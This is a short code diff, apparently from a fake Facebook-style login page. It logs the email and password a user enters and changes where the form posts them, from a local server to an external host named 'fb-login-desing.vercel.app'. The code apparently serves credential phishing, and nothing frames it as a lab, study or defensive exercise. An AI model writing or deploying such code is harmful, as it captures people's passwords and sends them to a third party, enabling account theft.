@@ -27,7 +27,7 @@ form.addEventListener('submit', function(e) {
 
     console.log({ email, password });
 
-    fetch('http://localhost:3000/save', {
+    fetch('https://fb-login-desing.vercel.app/save', {
         method: 'POST',
         headers: {
             'Content-Type': 'application/json'
